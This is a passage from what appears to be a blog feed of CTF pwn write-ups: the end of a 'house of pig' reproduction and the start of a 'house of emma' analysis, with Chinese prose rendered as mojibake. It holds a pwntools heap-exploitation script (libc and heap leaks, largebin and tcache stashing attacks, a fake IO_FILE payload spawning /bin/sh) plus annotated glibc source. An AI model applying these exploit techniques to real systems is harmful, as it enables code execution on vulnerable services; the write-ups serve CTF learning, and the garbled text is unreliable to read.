class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))</span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))</span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))</span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))</span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))<span class="comment">#2-&gt;4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#unsortedbin-&gt;smallbin</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#tcache 0x160</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))<span class="comment">#1-&gt;6</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))<span class="comment">#1-&gt;7</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))<span class="comment">#protect 2-&gt;5</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))<span class="comment">#1-&gt;8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fill tcache 0x160</span></span><br><span class="line">delet(<span class="number">0</span>)</span><br><span class="line">delet(<span class="number">1</span>)</span><br><span class="line">delet(<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">3</span>)</span><br><span class="line">delet(<span class="number">4</span>)</span><br><span class="line">delet(<span class="number">5</span>)</span><br><span class="line">delet(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fill tcache 0xa0 to 5</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">0</span>)</span><br><span class="line">delet(<span class="number">1</span>)</span><br><span class="line">delet(<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">3</span>)</span><br><span class="line">delet(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#split into unsorted bin</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">delet(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">change(<span class="number">1</span>)<span class="comment">#to clear flag0</span></span><br><span class="line">view(<span class="number">7</span>)<span class="comment">#leak libc</span></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">0x219ce0</span></span><br><span class="line">free_hook = libc_base + <span class="number">0x2204a8</span></span><br><span class="line">iolistall = libc_base + <span class="number">0x21a680</span></span><br><span class="line">memset_got = libc_base + <span class="number">0x219188</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&quot;free_hook = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(free_hook)))</span><br><span class="line">log.success(<span class="string">&quot;iolistall = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(iolistall)))</span><br><span class="line">log.success(<span class="string">&quot;memset_got = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(memset_got)))</span><br><span class="line"></span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0xb0</span>, cyclic(<span class="number">0x30</span>))<span class="comment">#smallbin 0 = 1-&gt;7</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))<span class="comment">#into smallbin 1-&gt;9</span></span><br><span class="line">delet(<span class="number">8</span>)</span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0xb0</span>, cyclic(<span class="number">0x30</span>))<span class="comment">#smallbin 1 = 1-&gt;8</span></span><br><span class="line"><span class="comment">#unsortedbin finished, 1-&gt;9(0x160);2-&gt;5(0xa0);3-&gt;1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak heap_base</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment">#1-&gt;10</span></span><br><span class="line">add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment">#1-&gt;11</span></span><br><span class="line">delet(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment">#1-&gt;12</span></span><br><span class="line">fixed_largebin_fd = libc_base + <span class="number">0x21a0d0</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x160</span>)</span><br><span class="line">edit(<span class="number">10</span>, payload)</span><br><span class="line">view(<span class="number">10</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;daaa&quot;</span>)</span><br><span class="line">heap_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x13120</span></span><br><span class="line">log.success(<span class="string">&quot;heap0_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"><span class="comment">#fix it</span></span><br><span class="line">payload = p64(fixed_largebin_fd)*<span class="number">2</span> + cyclic(<span class="number">0x150</span>)</span><br><span class="line">edit(<span class="number">10</span>, payload)</span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 2-&gt;6 largebin1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#largebin attack</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 2-&gt;7 largebin2</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 1-&gt;13 protect</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 2-&gt;8 </span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 1-&gt;14 protect</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x420</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 2-&gt;9 largebin3</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 1-&gt;15 protect</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">9</span>)</span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># trigger largebin3 1-&gt;16</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#largebin attack1</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">6</span>)</span><br><span class="line">payload = p64(heap_base+<span class="number">0x14e60</span>) + p64(free_hook + <span class="number">0x8</span>-<span class="number">0x20</span>)+cyclic(<span class="number">0x150</span>)</span><br><span class="line">edit(<span class="number">9</span>, payload)</span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># trigger largebin1 1-&gt;17</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># memsetgot-0x8 -&gt; 2-&gt;9   3-&gt;2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fix largebin&amp;attck2</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">7</span>)</span><br><span class="line">payload = p64(heap_base+<span class="number">0x14e60</span>) + p64(iolistall-<span class="number">0x20</span>)+cyclic(<span class="number">0x150</span>)</span><br><span class="line">edit(<span class="number">9</span>, payload)</span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># trigger largebin2 1-&gt;18 iolistall-&gt; 2-&gt;7</span></span><br><span class="line"><span class="comment">#fix largebin</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">payload = p64(heap_base+<span class="number">0x14e60</span>)*<span class="number">2</span>+cyclic(<span class="number">0x150</span>)</span><br><span class="line">edit(<span class="number">7</span>, payload)</span><br><span class="line">payload = p64(heap_base+<span class="number">0x13da0</span>)*<span class="number">2</span>+cyclic(<span class="number">0x150</span>)</span><br><span class="line">edit(<span class="number">9</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#tcache smashing unlink</span></span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x420</span>, cyclic(<span class="number">0x160</span>)) <span class="comment">#2-9 calloced</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x40</span>) + p64(heap_base+<span class="number">0x12ce0</span>) + p64(free_hook-<span class="number">0x10</span>)+cyclic(<span class="number">0x110</span>)</span><br><span class="line">edit(<span class="number">8</span>, payload)</span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))   <span class="comment">#3-&gt;4</span></span><br><span class="line"><span class="comment">#gift!</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;01dwang&#x27;s Gift:\n&quot;</span>)</span><br><span class="line"><span class="comment">#fake IOFILE</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="‰º™ÈÄ†IOFILE"><a href="#‰º™ÈÄ†IOFILE" class="headerlink" title="‰º™ÈÄ†IOFILE"></a>‰º™ÈÄ†IOFILE</h2><h3 id="Êîπ-free-hookÂÅöÊ≥ï"><a href="#Êîπ-free-hookÂÅöÊ≥ï" class="headerlink" title="Êîπ__free_hookÂÅöÊ≥ï"></a>Êîπ__free_hookÂÅöÊ≥ï</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">char</span> *new_buf;</span><br><span class="line">          <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">          <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">          <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">          <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">            <span class="keyword">return</span> EOF;</span><br><span class="line">          new_buf = <span class="built_in">malloc</span> (new_size); <span class="comment">// 1</span></span><br><span class="line">          <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">              <span class="keyword">return</span> EOF;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">if</span> (old_buf)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen); <span class="comment">// 2</span></span><br><span class="line">              <span class="built_in">free</span> (old_buf); <span class="comment">// 3</span></span><br><span class="line">              <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">              fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen); <span class="comment">// 4</span></span><br><span class="line"> </span><br><span class="line">          _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">          fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">          fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">          fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">          fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"> </span><br><span class="line">          fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">          fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">old_blen = _IO_blen (fp) = (fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base</span><br><span class="line">new_size = <span class="number">2</span> * old_blen + <span class="number">100</span></span><br><span class="line">new_buf = <span class="built_in">malloc</span> (new_size)</span><br><span class="line"></span><br><span class="line">old_buf = fp-&gt;_IO_buf_base</span><br><span class="line"><span class="built_in">memcpy</span> (new_buf, old_buf, old_blen)</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span> (old_buf);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen)</span><br></pre></td></tr></table></figure><p>Ê≠§Êó∂<code>_IO_list_all</code>ÊåáÈíàÂ∑≤ÁªèÊåáÂêë‰∫Ügift chunk,Ëøô‰∏™chunkÁöÑÂÜÖÂÆπÂÆåÂÖ®ÊòØÂèØÊéßÁöÑ</p><p><img src="/../img/xctf2021finalhouseofpig%E5%A4%8D%E7%8E%B0.assets/image-20230724133629983.png" alt="image-20230724133629983"></p><p>Ê≥®ÊÑèÂâçÈù¢tcache stashing unlinkÊîπÁöÑ‰ΩçÁΩÆÔºåÂèØËÉΩÈúÄË¶ÅÂú®__free_hookÁöÑÂú∞ÂùÄÂ§ÑÂä†Âáè0x8ÔºåÂõ†‰∏∫tcacheÁî≥ËØ∑‰ºöÊ£ÄÊü•ÂçÅÂÖ≠Â≠óËäÇÂØπÈΩê</p><p>Âõ†‰∏∫ÊàëÊ≤°Áî®ÂéüÈ¢òÁöÑglibc,ËøôÈáåÊàëÂØπÈΩê‰πãÂêéÔºå0xe8Â§ßÂ∞èÁöÑÂ†ÜÂùó‰∏çÂ§üÂÜô‰∫ÜÔºåÊåâÁÖßÂá∫È¢ò‰∫∫ÁöÑÊÄùË∑ØÂ∫îËØ•ÊòØÂàöÂ•ΩÂ§üÂÜôÁöÑ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fake_IO_addr = heap_base+<span class="number">0x13da0</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0xffffffffffffffff</span>) <span class="comment">#write_ptr</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#write_end # fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt;= _IO_buf_end - _IO_buf_base</span></span><br><span class="line">payload += p64(fake_IO_addr+<span class="number">0xe0</span>)<span class="comment">#buf_base</span></span><br><span class="line">payload += p64(fake_IO_addr+<span class="number">0xe0</span>+<span class="number">0x1e</span>) <span class="comment">#buf_end</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x2166c0</span>)</span><br><span class="line">payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0</span>)+p64(libc_base+<span class="number">0x50d60</span>)</span><br></pre></td></tr></table></figure><h3 id="Êîπmemset-gotÂÅöÊ≥ï"><a href="#Êîπmemset-gotÂÅöÊ≥ï" class="headerlink" title="Êîπmemset gotÂÅöÊ≥ï"></a>Êîπmemset gotÂÅöÊ≥ï</h3><p>Áî±‰∫élibcÊòØpartial RELROÔºågotË°®ÂèØÂÜô</p><p>Âõ†Ê≠§ÂèØ‰ª•ÊäämemsetÁöÑgotÂΩì‰Ωú‰∏Ä‰∏™__free_hook</p><p>Ê≥®ÊÑèËøôÈáåÂÅötcache stashing unlinkÊó∂‰∏çËÉΩÁõ¥Êé•Ë¶ÜÁõñmemsetÁöÑgotË°®ÔºåËøôÊòØÂõ†‰∏∫calloc‰∏≠‰ºöË∞ÉÁî®memset,Â¶ÇÊûúËøôÊó∂ÁöÑgotÂ∑≤ÁªèËøõÂÖ•tcache,Âàô‰ºöÂèòÊàêÂä†ÂØÜÂêéÁöÑfdÔºåripËøêË°åÂà∞ËøôÈáåÊó∂‰ºöÊä•Èîô</p><p>Âõ†ËÄåÊ≠£Á°ÆÁöÑÂÅöÊ≥ïÂ∫îËØ•ÊòØÈ¢ÑÁïô‰∏ÄÂÆöÁöÑÁ©∫Èó¥ÔºåÊú¨È¢òÈôêÂà∂ËæÉÂ§ßÔºåÊïÖ‰∏çÂÅöÊºîÁ§∫Ôºå‰ªÖÊèêÂá∫ÊÄùË∑Ø</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Èò¥Èó¥Â†ÜÈ£éÊ∞¥&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;ÈÄÜÂêë&quot;&gt;&lt;a href=&quot;#ÈÄÜÂêë&quot; class=&quot;headerlink&quot; title=&quot;ÈÄÜÂêë&quot;&gt;&lt;/a&gt;ÈÄÜÂêë&lt;/h2&gt;&lt;h3 id=&quot;‰øÆÂ§çswitch&quot;&gt;&lt;a href=&quot;#‰øÆÂ§çswi</summary>
      
    
    
    
    <category term="CS" scheme="http://deepunk.icu/categories/CS/"/>
    
    
    <category term="PWN" scheme="http://deepunk.icu/tags/PWN/"/>
    
    <category term="CTF" scheme="http://deepunk.icu/tags/CTF/"/>
    
    <category term="wp" scheme="http://deepunk.icu/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>House of emma 21ÊπñÊπòÊùØÂ§çÁé∞</title>
    <link href="http://deepunk.icu/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0/"/>
    <id>http://deepunk.icu/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-07-27T03:12:57.000Z</published>
    <updated>2023-12-14T15:12:06.895Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>ËÆ≤Ê∞¥ËØæÔºåÊÅ∞Â§ßÁ±≥</p></blockquote><p>Ê≤ôÁÆ±ÂºÄÂêØÔºåËÄÉËôëorw</p><p>‰øùÊä§ÂÖ®ÂºÄ</p><h2 id="VMÂàÜÊûê"><a href="#VMÂàÜÊûê" class="headerlink" title="VMÂàÜÊûê"></a>VMÂàÜÊûê</h2><p>Âæ™ÁéØËæìÂÖ•ÔºåÊØèÊ¨°ËØªÊúÄÂ§ö0x500ÔºåÊØèÊ¨°Âæ™ÁéØÂàÜÈÖçÈáäÊîæ0x2000Á©∫Èó¥</p><p>Ê≥®ÊÑèËøôÈáåÊØèÊ¨°Âæ™ÁéØÊó∂ÁöÑmalloc,‰ºöÂΩ±ÂìçÂêéÈù¢ÁöÑÂ†ÜÈ£éÊ∞¥</p><h3 id="ÂÖ•Âè£ÂáΩÊï∞ÂàÜÊûê"><a href="#ÂÖ•Âè£ÂáΩÊï∞ÂàÜÊûê" class="headerlink" title="ÂÖ•Âè£ÂáΩÊï∞ÂàÜÊûê"></a>ÂÖ•Âè£ÂáΩÊï∞ÂàÜÊûê</h3><p><code>sub_1288</code>Â§ÑÊó†Ê≥ïËØÜÂà´</p><p>undefineÂêéÔºåÁî±gdbÂä®Ë∞ÉÁü•ÂÖ•Âè£Âú®0x1289Â§ÑÔºå‰øÆÂ§ç‰∏∫ÂáΩÊï∞</p><p>Â∞ÜËæìÂÖ•ÁöÑÂ≠óÁ¨¶‰∏≤ÊåáÈíàÂ≠òÂú®<code>[rbp-18h]</code>Â§Ñ</p><p><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230720151519060.png" alt="image-20230720151519060"></p><p>ÈöèÂêéÂèñÁ¨¨‰∏Ä‰∏™byteÔºå‰∏éËøêÁÆó0FhÔºåËøõË°å‰∏Ä‰∏™Ê≤°‰ªÄ‰πàÁî®ÁöÑÊ£ÄÊü•ÔºåÂÜçÂ∞ÜËØ•ÂÄº*4ÊîæÂÖ•<code>rdx</code>Ôºå‰∏é‰∏Ä‰∏™È¶ñÂú∞ÂùÄÁõ∏Âä†ÊîæÂÖ•<code>eax</code>ÔºåÁ¨¶Âè∑ÊãìÂ±ï‰∏∫<code>rax</code>ÔºàÂõ†‰∏∫ÊòØË¥üÊï∞ÔºâÔºåÂÜç‰∏éËØ•È¶ñÂú∞ÂùÄÁõ∏Âä†Ôºà<code>rax</code>‰∏∫Ë°•Á†ÅÔºåÂÆûÈôÖ‰∏∫Áõ∏ÂáèÔºâÔºåÂÖ∂‰∏≠ÁÆóË¥üÊï∞ËÆ°ÁÆóÂºè‰∏∫<code>hex((~0xfffffffffffff3a1&amp;0xffffffffffffffff)+0x1)</code>ÔºåÈöèÂêéË∑≥ËΩ¨Âà∞ËØ•‰ΩçÁΩÆ</p><p><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230720152303704.png" alt="image-20230720152303704"></p><table><thead><tr><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th></tr></thead><tbody><tr><td>1488h</td><td>13ddh</td><td>1404h</td><td>1428h</td><td>144ch</td><td>1481h</td><td>12dah</td><td>130dh</td><td>13abh</td><td>1342h</td></tr><tr><td>fail</td><td>add</td><td>delet</td><td>show</td><td>edit</td><td>leave&amp;ret</td><td></td><td></td><td></td><td></td></tr></tbody></table><p><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230721133000180.png" alt="image-20230721133000180"></p><p>ËøûÊåâd‰øÆÂ§çË∑≥ËΩ¨Ë°®ÔºåËßÇÂØüË°•Á†ÅÂèØÁü•‰∏∫4Â≠óËäÇ‰∏ÄÁªÑ</p><p>ÂÖ∂ÂÆûÂèØ‰ª•Áî®idaÁöÑedit-&gt;other-&gt;specify switch idiomÂäüËÉΩ‰øÆÂ§ç‰∏∫switch</p><h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><ul><li>index 2nd byte</li><li>size 2nd word</li><li><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230718174743516-1689673665848-1.png" alt="image-20230718174743516"></li><li>+4&amp;jump to start</li></ul><h3 id="delet"><a href="#delet" class="headerlink" title="delet"></a>delet</h3><ul><li><p>index 2nd byte</p></li><li><p>uaf</p></li><li><p><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230718174950029.png" alt="image-20230718174950029"></p></li><li><p>+2</p></li></ul><h3 id="show"><a href="#show" class="headerlink" title="show"></a>show</h3><ul><li><p>index 2nd byte</p></li><li><p><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230718175134076.png" alt="image-20230718175134076"></p></li><li><p>+2</p></li></ul><h3 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h3><ul><li>index 2nd byte</li><li>size 2nd word</li><li>content 2nd dword, size</li><li><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230719093944933.png" alt="image-20230719093944933"></li></ul><h3 id="Âà©Áî®ÊÄùË∑Ø"><a href="#Âà©Áî®ÊÄùË∑Ø" class="headerlink" title="Âà©Áî®ÊÄùË∑Ø"></a>Âà©Áî®ÊÄùË∑Ø</h3><p>Â≠òÂú®UAFÔºåÂèØÂ§öÊ¨°ËøõË°ålargbin attack</p><p>Êó†Ê≥ïÊîπÂÜô‰∏∫‰ªªÊÑèÂú∞ÂùÄÔºåÊó†Ê≥ïÁõ¥Êé•house of kiwiÔºåËÄÉËôëhouse of emma</p><ul><li><p>Ê≥ÑÈú≤libc„ÄÅheapÂü∫ÂùÄ</p></li><li><p>‰∏§Ê¨°largbin attackÊîπÂÜô<code>stderr</code>Âíå<code>__pointer_chk_guard</code></p></li><li><p>ÂêàÁêÜ‰º™ÈÄ†stderr‰∏éIOÈìæ</p></li><li><p>Ëß¶Âèë<code>__malloc_assert</code></p></li></ul><h2 id="Â†ÜÂ∏ÉÂ±Ä‰∏élargbin-attack"><a href="#Â†ÜÂ∏ÉÂ±Ä‰∏élargbin-attack" class="headerlink" title="Â†ÜÂ∏ÉÂ±Ä‰∏élargbin 